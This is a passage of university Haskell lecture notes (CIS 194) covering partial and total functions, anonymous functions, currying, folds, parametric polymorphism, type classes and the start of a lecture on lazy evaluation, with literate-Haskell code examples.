inputs that will make them recurse infinitely are also called partial.
Functions which are well-defined on all possible inputs are known as
*total functions*.

It is good Haskell practice to avoid partial functions as much as
possible.  Actually, avoiding partial functions is good practice in
*any* programming language---but in most of them it's ridiculously
annoying.  Haskell tends to make it quite easy and sensible.

**`head` is a mistake!** It should not be in the `Prelude`.  Other
partial `Prelude` functions you should almost never use include
`tail`, `init`, `last`, and `(!!)`.  From this point on, using one of
these functions on a homework assignment will lose style points!

What to do instead? 

**Replacing partial functions**

Often partial functions like `head`, `tail`, and so on can be replaced
by pattern-matching.  Consider the following two definitions:

> doStuff1 :: [Int] -> Int
> doStuff1 []  = 0
> doStuff1 [_] = 0
> doStuff1 xs  = head xs + (head (tail xs)) 

> doStuff2 :: [Int] -> Int
> doStuff2 []        = 0
> doStuff2 [_]       = 0
> doStuff2 (x1:x2:_) = x1 + x2

These functions compute exactly the same result, and they are both
total.  But only the second one is *obviously* total, and it is much
easier to read anyway.

**Writing partial functions**

What if you find yourself *writing* a partial functions? There are two
approaches to take.  The first is to change the output type of the
function to indicate the possible failure. Recall the definition of `Maybe`:

~~~~ {.haskell}
data Maybe a = Nothing | Just a
~~~~

Now, suppose we were writing `head`.  We could rewrite it safely like
this:

> safeHead :: [a] -> Maybe a
> safeHead []    = Nothing
> safeHead (x:_) = Just x

Indeed, there is exactly such a function defined in the [`safe`
package](http://hackage.haskell.org/package/safe).

Why is this a good idea?

1. `safeHead` will never crash.  
2. The type of `safeHead` makes it obvious that it may fail for some
   inputs.
3. The type system ensures that users of `safeHead` must appropriately
   check the return value of `safeHead` to see whether they got a value
   or `Nothing`.

In some sense, `safeHead` is still "partial"; but we have reflected
the partiality in the type system, so it is now safe.  The goal is to
have the types tell us as much as possible about the behavior of
functions.

OK, but what if we know that we will only use `head` in situations
where we are *guaranteed* to have a non-empty list?  In such a
situation, it is really annoying to get back a `Maybe a`, since we
have to expend effort dealing with a case which we "know" cannot
actually happen.  

The answer is that if some condition is really *guaranteed*, then the
types ought to reflect the guarantee!  Then the compiler can enforce
your guarantees for you.  For example:

> data NonEmptyList a = NEL a [a]
>
> nelToList :: NonEmptyList a -> [a]
> nelToList (NEL x xs) = x:xs
>
> listToNel :: [a] -> Maybe (NonEmptyList a)
> listToNel []     = Nothing
> listToNel (x:xs) = Just $ NEL x xs
>
> headNEL :: NonEmptyList a -> a
> headNEL (NEL a _) = a
>
> tailNEL :: NonEmptyList a -> [a]
> tailNEL (NEL _ as) = as

You might think doing such things is only for chumps who are not
coding super-geniuses like you.  Of course, *you* would never make a
mistake like passing an empty list to a function which expects only
non-empty ones.  Right?  Well, there's definitely a chump involved,
but it's not who you think.


/CS194 Lectures 04 Higher-order programming and type inference
==============================================================

<!--
{-# OPTIONS_GHC -Wall #-}
-->


CIS 194 Week 4  
4 February 2013

Suggested reading: 

  * *Learn You a Haskell for Great Good* chapter "Higher-Order Functions" (Chapter 5 in the printed book; [Chapter 6 online](http://learnyouahaskell.com/higher-order-functions))

Anonymous functions
-------------------

Suppose we want to write a function 

~~~~ {.haskell}
greaterThan100 :: [Integer] -> [Integer]
~~~~

which keeps only those `Integers` from the input list which are
greater than 100.  For example, 

~~~~ {.haskell}
greaterThan100 [1,9,349,6,907,98,105] = [349,907,105].
~~~~

By now, we know a nice way to do this: 

> gt100 :: Integer -> Bool
> gt100 x = x > 100
>
> greaterThan100 :: [Integer] -> [Integer]
> greaterThan100 xs = filter gt100 xs

But it's annoying to give `gt100` a name, since we are probably never
going to use it again.  Instead, we can use an *anonymous function*,
also known as a *lambda abstraction*:

> greaterThan100_2 :: [Integer] -> [Integer]
> greaterThan100_2 xs = filter (\x -> x > 100) xs

`\x -> x > 100` (the backslash is supposed to look kind of like a
lambda with the short leg missing) is the function which takes a
single argument `x` and outputs whether `x` is greater than 100.

Lambda abstractions can also have multiple arguments. For example:

    Prelude> (\x y z -> [x,2*y,3*z]) 5 6 3
    [5,12,9]

However, in the particular case of `greaterThan100`, there's an even
better way to write it, without a lambda abstraction:

> greaterThan100_3 :: [Integer] -> [Integer]
> greaterThan100_3 xs = filter (>100) xs

`(>100)` is an *operator section*: if `?` is an operator, then `(?y)`
is equivalent to the function `\x -> x ? y`, and `(y?)` is equivalent
to `\x -> y ? x`.  In other words, using an operator section allows us
to *partially apply* an operator to one of its two arguments.  What we
get is a function of a single argument.  Here are some examples:

    Prelude> (>100) 102
    True
    Prelude> (100>) 102
    False
    Prelude> map (*6) [1..5]
    [6,12,18,24,30]

Function composition
--------------------

Before reading on, can you write down a function whose type is

~~~~ {.haskell}
(b -> c) -> (a -> b) -> (a -> c)
~~~~

?

Let's try.  It has to take two arguments, both of which are functions,
and output a function.

~~~~ {.haskell}
foo f g = ...
~~~~

In the place of the `...` we need to write a function of type `a ->
c`.  Well, we can create a function using a lambda abstraction:

~~~~ {.haskell}
foo f g = \x -> ...
~~~~

`x` will have type `a`, and now in the `...` we need to write an
expression of type `c`.  Well, we have a function `g` which can turn
an `a` into a `b`, and a function `f` which can turn a `b` into a `c`,
so this ought to work:

> foo :: (b -> c) -> (a -> b) -> (a -> c)
> foo f g = \x -> f (g x)

(Quick quiz: why do we need the parentheses around `g x`?)

OK, so what was the point of that?  Does `foo` actually do anything
useful or was that just a silly exercise in working with types?

As it turns out, `foo` is really called `(.)`, and represents
*function composition*.  That is, if `f` and `g` are functions, then
`f . g` is the function which does first `g` and then `f`.

Function composition can be quite useful in writing concise, elegant
code.  It fits well in a "wholemeal" style where we think about
composing together successive high-level transformations of a data
structure.

As an example, consider the following function: 

> myTest :: [Integer] -> Bool
> myTest xs = even (length (greaterThan100 xs))

We can rewrite this as: 

> myTest' :: [Integer] -> Bool
> myTest' = even . length . greaterThan100

This version makes much clearer what is really going on: `myTest'` is
just a "pipeline" composed of three smaller functions.  This example
also demonstrates why function composition seems "backwards": it's
because function application is backwards!  Since we read from left to
right, it would make sense to think of values as also flowing from
left to right.  But in that case we should write \\( (x)f \\) to
denote giving the value \\(x\\) as an input to the function \\(f\\).
But no thanks to Alexis Claude Clairaut and Euler, we have been stuck
with the backwards notation since 1734.

Let's take a closer look at the type of `(.)`.  If we ask `ghci` for
its type, we get

    Prelude> :t (.)
    (.) :: (b -> c) -> (a -> b) -> a -> c

Wait a minute.  What's going on here?  What happened to the
parentheses around `(a -> c)`?

Currying and partial application
--------------------------------

Remember how the types of multi-argument functions look weird, like
they have "extra" arrows in them?  For example, consider the function

> f :: Int -> Int -> Int
> f x y = 2*x + y

I promised before that there is a beautiful, deep reason for this, and
now it's finally time to reveal it: *all functions in Haskell take
only one argument*.  Say what?! But doesn't the function `f` shown
above take two arguments?  No, actually, it doesn't: it takes one
argument (an `Int`) and *outputs a function* (of type `Int -> Int`);
that function takes one argument and returns the final answer.  In
fact, we can equivalently write `f`'s type like this:

> f' :: Int -> (Int -> Int)
> f' x y = 2*x + y

In particular, note that function arrows *associate to the right*,
that is, `W -> X -> Y -> Z` is equivalent to `W -> (X -> (Y -> Z))`.
We can always add or remove parentheses around the rightmost top-level
arrow in a type.

Function application, in turn, is *left*-associative. That is, `f 3 2`
is really shorthand for `(f 3) 2`.  This makes sense given what we
said previously about `f` actually taking one argument and returning a
function: we apply `f` to an argument `3`, which returns a function of
type `Int -> Int`, namely, a function which takes an `Int` and adds 6
to it. We then apply that function to the argument `2` by writing `(f
3) 2`, which gives us an `Int`.  Since function application associates
to the left, however, we can abbreviate `(f 3) 2` as `f 3 2`, giving
us a nice notation for `f` as a "multi-argument" function.

The "multi-argument" lambda abstraction 

~~~~ {.haskell}
\x y z -> ... 
~~~~

is really just syntax sugar for 

~~~~ {.haskell}
\x -> (\y -> (\z -> ...)).  
~~~~

Likewise, the function definition 

~~~~ {.haskell}
f x y z = ... 
~~~~

is syntax sugar for 

~~~~ {.haskell}
f = \x -> (\y -> (\z -> ...)).
~~~~

Note, for example, that we can rewrite our composition function from
above by moving the `\x -> ...` from the right-hand side of the `=` to
the left-hand side:

> comp :: (b -> c) -> (a -> b) -> a -> c
> comp f g x = f (g x)

This idea of representing multi-argument functions as one-argument
functions returning functions is known as *currying*, named for the
British mathematician and logician Haskell Curry.  (His first name
might sound familiar; yes, it's the same guy.) Curry lived from
1900-1982 and spent much of his life at Penn State---but he also
helped work on ENIAC at UPenn.  The idea of representing
multi-argument functions as one-argument functions returning functions
was actually first discovered by Moses Schönfinkel, so we probably
ought to call it *schönfinkeling*.  Curry himself attributed the idea
to Schönfinkel, but others had already started calling it "currying"
and it was too late.

If we want to actually represent a function of two arguments we
can use a single argument which is a tuple.  That is, the function

> f'' :: (Int,Int) -> Int
> f'' (x,y) = 2*x + y

can also be thought of as taking "two arguments", although in another
sense it really only takes one argument which happens to be a pair.
In order to convert between the two representations of a two-argument
function, the standard library defines functions called `curry` and
`uncurry`, defined like this (except with different names):

> schönfinkel :: ((a,b) -> c) -> a -> b -> c
> schönfinkel f x y = f (x,y)
>
> unschönfinkel :: (a -> b -> c) -> (a,b) -> c
> unschönfinkel f (x,y) = f x y

`uncurry` in particular can be useful when you have a pair and want to
apply a function to it.  For example:

    Prelude> uncurry (+) (2,3)
    5

**Partial application**

The fact that functions in Haskell are curried makes *partial
application* particularly easy.  The idea of partial application is
that we can take a function of multiple arguments and apply it to just
*some* of its arguments, and get out a function of the remaining
arguments.  But as we've just seen, in Haskell there *are no*
functions of multiple arguments!  Every function can be "partially
applied" to its first (and only) argument, resulting in a function of
the remaining arguments.

Note that Haskell doesn't make it easy to partially apply to an
argument other than the first. The one exception is infix operators,
which as we've seen, can be partially applied to either of their two
arguments using an operator section.  In practice this is not that big
of a restriction.  There is an art to deciding the order of arguments
to a function to make partial applications of it as useful as
possible: the arguments should be ordered from from "least to greatest
variation", that is, arguments which will often be the same should be
listed first, and arguments which will often be different should come
last.

**Wholemeal programming**

Let's put some of the things we've just learned together in an example
that also shows the power of a "wholemeal" style of programming.
Consider the function `foobar`, defined as follows:

> foobar :: [Integer] -> Integer
> foobar []     = 0
> foobar (x:xs)
>   | x > 3     = (7*x + 2) + foobar xs
>   | otherwise = foobar xs

This seems straightforward enough, but it is not good Haskell
style. The problem is that it is

  * doing too much at once; and
  * working at too low of a level.

Instead of thinking about what we want to do with each element, we can
instead think about making incremental transformations to the entire
input, using the existing recursion patterns that we know of.  Here's
a much more idiomatic implementation of `foobar`:

> foobar' :: [Integer] -> Integer
> foobar' = sum . map (\x -> 7*x + 2) . filter (>3)

This defines `foobar'` as a "pipeline" of three functions: first, we
throw away all elements from the list which are not greater than
three; next, we apply an arithmetic operation to every element of the
remaining list; finally, we sum the results.

Notice that in the above example, `map` and `filter` have been
partially applied.  For example, the type of `filter` is

~~~~ {.haskell}
(a -> Bool) -> [a] -> [a]
~~~~

Applying it to `(>3)` (which has type `Integer -> Bool`) results in a
function of type `[Integer] -> [Integer]`, which is exactly the right
sort of thing to compose with another function on `[Integer]`.

This style of coding in which we define a function without reference
to its arguments---in some sense saying what a function *is* rather
than what it *does*---is known as "point-free" style.  As we can see
from the above example, it can be quite beautiful.  Some people might
even go so far as to say that you should always strive to use
point-free style; but taken too far it can become extremely confusing.
`lambdabot` in the `#haskell` IRC channel has a command `@pl` for
turning functions into equivalent point-free expressions; here's an
example:

    @pl \f g x y -> f (x ++ g x) (g y)
    join . ((flip . ((.) .)) .) . (. ap (++)) . (.)

This is clearly *not* an improvement! 

Folds
-----

We have one more recursion pattern on lists to talk about: folds.
Here are a few functions on lists that follow a similar pattern: all
of them somehow "combine" the elements of the list into a final
answer.

> sum' :: [Integer] -> Integer
> sum' []     = 0
> sum' (x:xs) = x + sum' xs
>
> product' :: [Integer] -> Integer
> product' [] = 1
> product' (x:xs) = x * product' xs
>
> length' :: [a] -> Int
> length' []     = 0
> length' (_:xs) = 1 + length' xs

What do these three functions have in common, and what is different?
As usual, the idea will be to abstract out the parts that vary, aided
by the ability to define higher-order functions.

> fold :: b -> (a -> b -> b) -> [a] -> b
> fold z f []     = z
> fold z f (x:xs) = f x (fold z f xs)

Notice how `fold` essentially replaces `[]` with `z` and `(:)` with
`f`, that is,

    fold f z [a,b,c] == a `f` (b `f` (c `f` z))

(If you think about `fold` from this perspective, you may be able to
figure out how to generalize `fold` to data types other than lists...)

Now let's rewrite `sum'`, `product'`, and `length'` in terms of `fold`:

> sum''     = fold 0 (+)
> product'' = fold 1 (*)
> length''  = fold 0 (\_ s -> 1 + s)

(Instead of `(\_ s -> 1 + s)` we could also write `(\_ -> (1+))` or
even `(const (1+))`.)

Of course, `fold` is already provided in the standard Prelude, under
the name [`foldr`](http://haskell.org/ghc/docs/latest/html/libraries/base/Prelude.html#v:foldr). The arguments to `foldr` are in a slightly
different order but it's the exact same function.  Here are some
Prelude functions which are defined in terms of `foldr`:

  * `length`  `::          [a] -> Int`
  * `sum`     `:: Num a => [a] -> a`
  * `product` `:: Num a => [a] -> a`
  * `and`     `::          [Bool] -> Bool`
  * `or`      `::          [Bool] -> Bool`
  * `any`     `:: (a -> Bool) -> [a] -> Bool`
  * `all`     `:: (a -> Bool) -> [a] -> Bool`

There is also [`foldl`](http://haskell.org/ghc/docs/latest/html/libraries/base/Prelude.html#v:foldl), which folds "from the left".  That is,

    foldr f z [a,b,c] == a `f` (b `f` (c `f` z))
    foldl f z [a,b,c] == ((z `f` a) `f` b) `f` c

In general, however, you should use [`foldl'` from 
`Data.List`](http://haskell.org/ghc/docs/latest/html/libraries/base/Data-List.html#v:foldl)
instead, which does the same thing as `foldl` but is more efficient.


/CS194 Lectures 05 More polymorphism and type classes
=====================================================

 <!-- CLASS

> {-# LANGUAGE FlexibleInstances, MultiParamTypeClasses #-}
> {-# OPTIONS_GHC -Wall -fno-warn-missing-signatures #-}

-->

CIS 194 Week 5  
11 February 2013

Haskell's particular brand of polymorphism is known as *parametric*
polymorphism.  Essentially, this means that polymorphic functions must
work *uniformly* for any input type.  This turns out to have some
interesting implications for both programmers and users of polymorphic
functions.

Parametricity
-------------

Consider the type

~~~~ {.haskell}
a -> a -> a
~~~~

Remember that `a` is a *type variable* which can stand for any type.
What sorts of functions have this type?

What about this:

~~~~ {.haskell}
f :: a -> a -> a
f x y = x && y
~~~~

It turns out that this doesn't work.  The syntax is valid, at least,
but it does not type check.  In particular we get this error message:

    2012-02-09.lhs:37:16:
        Couldn't match type `a' with `Bool'
          `a' is a rigid type variable bound by
              the type signature for f :: a -> a -> a at 2012-02-09.lhs:37:3
        In the second argument of `(&&)', namely `y'
        In the expression: x && y
        In an equation for `f': f x y = x && y

The reason this doesn't work is that the *caller* of a polymorphic
function gets to choose the type.  Here we, the *implementors*, have
tried to choose a specific type (namely, `Bool`), but we may be given
`String`, or `Int`, or even some type defined by someone using `f`,
which we can't possibly know about in advance.  In other words, you
can read the type

~~~~ {.haskell}
a -> a -> a
~~~~

as a *promise* that a function with this type will work no matter what
type the caller chooses.

Another implementation we could imagine is something like

    f a1 a2 = case (typeOf a1) of
                Int  -> a1 + a2
                Bool -> a1 && a2
                _    -> a1

where `f` behaves in some specific ways for certain types.  After all,
we can certainly implement this in Java:

    class AdHoc {

        public static Object f(Object a1, Object a2) {
            if (a1 instanceof Integer && a2 instanceof Integer) {
                return (Integer)a1 + (Integer)a2;
            } else if (a1 instanceof Boolean && a2 instanceof Boolean) {
                return (Boolean)a1 && (Boolean)a2;
            } else {
                return a1;
            }
        }

        public static void main (String[] args) {
            System.out.println(f(1,3));
            System.out.println(f(true, false));
            System.out.println(f("hello", "there"));
        }

    }

    [byorgey@LVN513-9:~/tmp]$ javac Adhoc.java && java AdHoc
    4
    false
    hello

But it turns out there is no way to write this in Haskell.  Haskell
does not have anything like Java's `instanceof` operator: it is not
possible to ask what type something is and decide what to do based on
the answer.  One reason for this is that Haskell types are *erased* by
the compiler after being checked: at runtime, there is no type
information around to query!  However, as we will see, there are other
good reasons too.

This style of polymorphism is known as *parametric polymorphism*.  We
say that a function like `f :: a -> a -> a` is *parametric* in the
type `a`.  Here "parametric" is just a fancy term for "works uniformly
for any type chosen by the caller".  In Java, this style of
polymorphism is provided by *generics* (which, you guessed it, were
inspired by Haskell: one of the original designers of Haskell,
[Philip Wadler](http://homepages.inf.ed.ac.uk/wadler/), was later one
of the key players in the development of Java generics).

So, what functions actually *could* have this type?  Actually, there
are only two!

~~~~ {.haskell}
f1 :: a -> a -> a
f1 x y = x

f2 :: a -> a -> a
f2 x y = y
~~~~

So it turns out that the type `a -> a -> a` really tells us quite a
lot.

Let's play the parametricity game!  Consider each of the following
polymorphic types.  For each type, determine what behavior(s) a
function of that type could possibly have.

  * `a -> a`
  * `a -> b`
  * `a -> b -> a`
  * `[a] -> [a]`
  * `(b -> c) -> (a -> b) -> (a -> c)`
  * `(a -> a) -> a -> a`

Two views on parametricity
--------------------------

As an *implementor* of polymorphic functions, especially if you are
used to a language with a construct like Java's `instanceof`, you
might find these restrictions annoying.  "What do you mean, I'm not
allowed to do X?"

However, there is a dual point of view.  As a *user* of polymorphic
functions, parametricity corresponds not to *restrictions* but to
*guarantees*.  In general, it is much easier to use and reason about
tools when those tools give you strong guarantees as to how they will
behave.  Parametricity is part of the reason that just looking at the
type of Haskell function can tell you so much about the function.

OK, fine, but sometimes it really is useful to be able to decide what
to do based on types!  For example, what about addition?  We've
already seen that addition is polymorphic (it works on `Int`,
`Integer`, and `Double`, for example) but clearly it has to know what
type of numbers it is adding to decide what to do: adding two
`Integer`s works in a completely different way than adding two
`Double`s.  So how does it actually work? Is it just magical?

In fact, it isn't!  And we *can* actually use Haskell to decide what
to do based on types---just not in the way we were imagining before.
Let's start by taking a look at the type of `(+)`:

    Prelude> :t (+)
    (+) :: Num a => a -> a -> a

Hmm, what's that `Num a =>` thingy doing there?  In fact, `(+)` isn't
the only standard function with a funny double-arrow thing in its
type.  Here are a few others:

~~~~ {.haskell}
(==) :: Eq a   => a -> a -> Bool
(<)  :: Ord a  => a -> a -> Bool
show :: Show a => a -> String
~~~~

So what's going on here? 

Type classes
------------

`Num`, `Eq`, `Ord`, and `Show` are *type classes*, and we say that
`(==)`, `(<)`, and `(+)` are "type-class polymorphic".  Intuitively,
type classes correspond to *sets of types* which have certain
operations defined for them, and type class polymorphic functions work
only for types which are instances of the type class(es) in question.
As an example, let's look in detail at the `Eq` type class.

~~~~ {.haskell}
class Eq a where
  (==) :: a -> a -> Bool
  (/=) :: a -> a -> Bool
~~~~

We can read this as follows: `Eq` is declared to be a type class with
a single parameter, `a`.  Any type `a` which wants to be an *instance*
of `Eq` must define two functions, `(==)` and `(/=)`, with the
indicated type signatures.  For example, to make `Int` an instance of
`Eq` we would have to define `(==) :: Int -> Int -> Bool` and `(/=) ::
Int -> Int -> Bool`.  (Of course, there's no need, since the standard
Prelude already defines an `Int` instance of `Eq` for us.)

Let's look at the type of `(==)` again: 

~~~~ {.haskell}
(==) :: Eq a => a -> a -> Bool
~~~~

The `Eq a` that comes before the `=>` is a *type class constraint*.
We can read this as saying that for any type `a`, *as long as `a` is
an instance of `Eq`*, `(==)` can take two values of type `a` and
return a `Bool`.  It is a type error to call the function `(==)` on
some type which is not an instance of `Eq`.  If a normal polymorphic
type is a promise that the function will work for whatever type the
caller chooses, a type class polymorphic function is a *restricted*
promise that the function will work for any type the caller chooses,
*as long as* the chosen type is an instance of the required type
class(es).

The important thing to note is that when `(==)` (or any type class
method) is used, the compiler uses type inference to figure out *which
implementation of `(==)` should be chosen*, based on the inferred
types of its arguments.  In other words, it is something like using an
overloaded method in a language like Java.

To get a better handle on how this works in practice, let's make our
own type and declare an instance of `Eq` for it.

> data Foo = F Int | G Char
>
> instance Eq Foo where
>   (F i1) == (F i2) = i1 == i2
>   (G c1) == (G c2) = c1 == c2
>   _ == _ = False
>
>   foo1 /= foo2 = not (foo1 == foo2)

It's a bit annoying that we have to define both `(==)` and `(/=)`.  In
fact, type classes can give *default implementations* of methods in
terms of other methods, which should be used whenever an instance does
not override the default definition with its own.  So we could imagine
declaring `Eq` like this:

~~~~ {.haskell}
class Eq a where
  (==) :: a -> a -> Bool
  (/=) :: a -> a -> Bool
  x /= y = not (x == y)
~~~~

Now anyone declaring an instance of `Eq` only has to specify an
implementation of `(==)`, and they will get `(/=)` for free.  But if
for some reason they want to override the default implementation of
`(/=)` with their own, they can do that as well.

In fact, the `Eq` class is actually declared like this: 

~~~~ {.haskell}
class Eq a where
  (==), (/=) :: a -> a -> Bool
  x == y = not (x /= y)
  x /= y = not (x == y)
~~~~

This means that when we make an instance of `Eq`, we can define
*either* `(==)` or `(/=)`, whichever is more convenient; the other one
will be automatically defined in terms of the one we specify.
(However, we have to be careful: if we don't specify either one, we
get infinite recursion!)

As it turns out, `Eq` (along with a few other standard type classes)
is special: GHC is able to automatically generate instances of `Eq`
for us.  Like so:

> data Foo' = F' Int | G' Char
>   deriving (Eq, Ord, Show)

This tells GHC to automatically derive instances of the `Eq`, `Ord`,
and `Show` type classes for our data type `Foo`.

**Type classes and Java interfaces**

Type classes are quite similar to Java interfaces.  Both define a set
of types/classes which implement a specified list of operations.
However, there are a couple of important ways in which type classes
are more general than Java interfaces:

  1. When a Java class is defined, any interfaces it implements must be
    declared.  Type class instances, on the other hand, are declared
    separately from the declaration of the corresponding types, and can
    even be put in a separate module.

  2. The types that can be specified for type class methods are more
    general and flexible than the signatures that can be given for Java
    interface methods, especially when *multi-parameter type classes*
    enter the picture.  For example, consider a hypothetical type class

    > class Blerg a b where
    >   blerg :: a -> b -> Bool

    Using `blerg` amounts to doing *multiple dispatch*: which
    implementation of `blerg` the compiler should choose depends on
    *both* the types `a` and `b`.  There is no easy way to do this in
    Java.

    Haskell type classes can also easily handle binary (or ternary, or
    ...) methods, as in

    > class Num a where
    >   (+) :: a -> a -> a
    >   ...

    There is no nice way to do this in Java: for one thing, one of the
    two arguments would have to be the "privileged" one which is actually
    getting the `(+)` method invoked on it, and this asymmetry is awkward.
    Furthermore, because of Java's subtyping, getting two arguments of a
    certain interface type does *not* guarantee that they are actually the
    same type, which makes implementing binary operators such as `(+)`
    awkward (usually requiring some runtime type checks).

**Standard type classes**

Here are some other standard type classes you should know about:

  * [Ord](http://haskell.org/ghc/docs/latest/html/libraries/base/Prelude.html#t%3AOrd)
    is for types whose elements can be *totally ordered*, that is, where
    any two elements can be compared to see which is less than the other.
    It provides comparison operations like `(<)` and `(<=)`, and also the
    `compare` function.

  * [Num](http://haskell.org/ghc/docs/latest/html/libraries/base/Prelude.html#t%3ANum)
    is for "numeric" types, which support things like addition,
    subtraction, and multipication.  One very important thing to note is
    that integer literals are actually type class polymorphic:

        Prelude> :t 5
        5 :: Num a => a

    This means that literals like `5` can be used as `Int`s,
    `Integer`s, `Double`s, or any other type which is an instance of
    `Num` (`Rational`, `Complex Double`, or even a type you define...)

  * [Show](http://haskell.org/ghc/docs/latest/html/libraries/base/Prelude.html#t%3AShow)
    defines the method `show`, which is used to convert values into
    `String`s.

  * [Read](http://haskell.org/ghc/docs/latest/html/libraries/base/Prelude.html#v:Eq/Read) is the dual of `Show`.

  * [Integral](http://haskell.org/ghc/docs/latest/html/libraries/base/Prelude.html#t%3AIntegral) represents whole number types such as `Int` and `Integer`.

**A type class example**

As an example of making our own type class, consider the following:

> class Listable a where
>   toList :: a -> [Int]

We can think of `Listable` as the class of things which can be
converted to a list of `Int`s.  Look at the type of `toList`:

~~~~ {.haskell}
toList :: Listable a => a -> [Int]
~~~~

Let's make some instances for `Listable`.  First, an `Int` can be
converted to an `[Int]` just by creating a singleton list, and `Bool`
can be converted similarly, say, by translating `True` to `1` and
`False` to `0`:

> instance Listable Int where
>   -- toList :: Int -> [Int]
>   toList x = [x]
>
> instance Listable Bool where
>   toList True  = [1]
>   toList False = [0]

We don't need to do any work to convert a list of `Int` to a list of
`Int`:

> instance Listable [Int] where
>   toList = id

Finally, here's a binary tree type which we can convert to a list by
flattening:

> data Tree a = Empty | Node a (Tree a) (Tree a)
>
> instance Listable (Tree Int) where
>   toList Empty        = []
>   toList (Node x l r) = toList l ++ [x] ++ toList r

If we implement other functions in terms of `toList`, they also get a
`Listable` constraint.  For example:

> -- to compute sumL, first convert to a list of Ints, then sum
> sumL x = sum (toList x)

`ghci` informs us that type type of `sumL` is

~~~~ {.haskell}
sumL :: Listable a => a -> Int
~~~~

which makes sense: `sumL` will work only for types which are instances
of `Listable`, since it uses `toList`.  What about this one?

> foo x y = sum (toList x) == sum (toList y) || x < y

`ghci` informs us that the type of `foo` is

~~~~ {.haskell}
foo :: (Listable a, Ord a) => a -> a -> Bool
~~~~

That is, `foo` works over types which are instances of *both*
`Listable` and `Ord`, since it uses both `toList` and comparison on
the arguments.

As a final, and more complex, example, consider this instance:

> instance (Listable a, Listable b) => Listable (a,b) where
>   toList (x,y) = toList x ++ toList y

Notice how we can put type class constraints on an instance as well as
on a function type.  This says that a pair type `(a,b)` is an instance
of `Listable` as long as `a` and `b` both are.  Then we get to use
`toList` on values of types `a` and `b` in our definition of `toList`
for a pair.  Note that this definition is *not* recursive!  The
version of `toList` that we are defining is calling *other* versions
of `toList`, not itself.



 <!--

Type classes under the hood
---------------------------

XXX Not necessary, but can give some good intuition.

Play it by ear and see if I end up covering this in class.  Depends
how much time we have.  "simulate" our own type classes with
dictionary = record of functions.  Do example with Ord.  Type classes
just make this extra dictionary argument implicit.

-->

 <!--

Newtype  (???)
-------

XXX A good way to motivate it would be different Monoids for numeric
types, but we won't talk about Monoid today...  Cover it now or wait
until Monoid?

-->

 <!--

Local Variables:
mode:markdown
compile-command:"make explec"
End:

-->


/CS194 Lectures 06 Lazy evaluation
==================================

 <!-- CLASS

> {-# OPTIONS_GHC -Wall #-}

-->

CIS 194 Week 6  
18 February 2012

Suggested reading: 

  * [foldr foldl foldl'](http://haskell.org/haskellwiki/Foldr_Foldl_Foldl%27) from the Haskell wiki


On the first day of class I mentioned that Haskell is *lazy*, and
promised to eventually explain in more detail what this means.  The
time has come!

Strict evaluation
-----------------

Before we talk about *lazy evaluation* it will be useful to look at
some examples of its opposite, *strict evaluation*.

Under a strict evaluation strategy, function arguments are completely
evaluated *before* passing them to the function. For example, suppose
we have defined

~~~~ {.haskell}
f x y = x + 2
~~~~

In a strict language, evaluating `f 5 (29^35792)` will first
completely evaluate `5` (already done) and `29^35792` (which is a lot
of work) before passing the results to `f`.

Of course, in this *particular* example, this is silly, since `f`
ignores its second argument, so all the work to compute `29^35792` was
wasted.  So why would we want this?

The benefit of strict evaluation is that it is easy to predict *when*
and *in what order* things will happen.  Usually languages with
strict evaluation will even specify the order in which function
arguments should be evaluated (*e.g.* from left to right).

For example, in Java if we write

    f (release_monkeys(), increment_counter())
    
we know that the monkeys will be released, and then the counter will
be incremented, and then the results of doing those things will be
passed to `f`, and it does not matter whether `f` actually ends up
using those results.  

If the releasing of monkeys and incrementing of the counter could
independently happen, or not, in either order, depending on whether
`f` happens to use their results, it would be extremely
confusing. When such "side effects" are allowed, strict evaluation is
really what you want.

Side effects and purity
-----------------------

So, what's really at issue here is the presence or absence of *side
effects*.  By "side effect" we mean *anything that causes evaluation
of an expression to interact with something outside itself*.  The root
issue is that such outside interactions are time-sensitive.  For
example:

* Modifying a global variable --- it matters when this happens since
  it may affect the evaluation of other expressions
* Printing to the screen --- it matters when this happens since it may
  need to be in a certain order with respect to other writes to the
  screen
* Reading from a file or the network --- it matters when this happens
  since the contents of the file can affect the outcome of the
  expression

As we have seen, lazy evaluation makes it hard to reason about when
things will be evaluated; hence including side effects in a lazy
language would be extremely unintuitive. Historically, this is the
reason Haskell is pure: initially, the designers of Haskell wanted to
make a *lazy* functional language, and quickly realized it would be
impossible unless it also disallowed side effects.

But... a language with *no* side effects would not be very useful.
The only thing you could do with such a language would be to load up
your programs in an interpreter and evaluate expressions. (Hmm... that
sounds familiar...) You would not be able to get any input from the
user, or print anything to the screen, or read from a file.  The
challenge facing the Haskell designers was to come up with a way to
allow such effects in a principled, restricted way that did not
interfere with the essential purity of the language.  They finally did
come up with something (namely, the `IO` monad) which we'll talk about
in a few weeks.

Lazy evaluation
---------------

<img src="/static/relax.jpg" width="200px" />

So now that we understand strict evaluation, let's see what lazy
evaluation actually looks like. Under a lazy evaluation strategy,
evaluation of function arguments is *delayed as long as possible*:
they are not evaluated until it actually becomes necessary to do so.
When some expression is given as an argument to a function, it is
simply packaged up as an *unevaluated expression* (called a "thunk",
don't ask me why) without doing any actual work.

For example, when evaluating `f 5 (29^35792)`, the second argument
will simply be packaged up into a thunk without doing any actual
computation, and `f` will be called immediately.  Since `f` never uses
its second argument the thunk will just be thrown away by the garbage
collector.

Pattern matching drives evaluation
----------------------------------

So, when is it "necessary" to evaluate an expression? The examples
above concentrated on whether a function *used* its arguments, but
this is actually not the most important distinction. Consider the
following examples:

> f1 :: Maybe a -> [Maybe a]
> f1 m = [m,m]
>
> f2 :: Maybe a -> [a]
> f2 Nothing  = []
> f2 (Just x) = [x]

`f1` and `f2` both *use* their argument.  But there is still a big
difference between them.  Although `f1` uses its argument `m`, it does
not need to know anything about it.  `m` can remain completely
unevaluated, and the unevaluated expression is simply put in a list.
Put another way, the result of `f1 e` does not depend on the shape of
`e`.

`f2`, on the other hand, needs to know something about its argument in
order to proceed: was it constructed with `Nothing` or `Just`?  That
is, in order to evaluate `f2 e`, we must first evaluate `e`, because
the result of `f2` depends on the shape of `e`.

The other important thing to note is that thunks are evaluated *only
enough* to allow a pattern match to proceed, and no further!  For
example, suppose we wanted to evaluate `f2 (safeHead [3^500, 49])`.
`f2` would force evaluation of the call to `safeHead [3^500, 49]`,
which would evaluate to `Just (3^500)`---note that the `3^500` is
*not* evaluated, since `safeHead` does not need to look at it, and
neither does `f2`.  Whether the `3^500` gets evaluated later depends
on how the result of `f2` is used.

The slogan to remember is "*pattern matching drives evaluation*".  To
reiterate the important points:

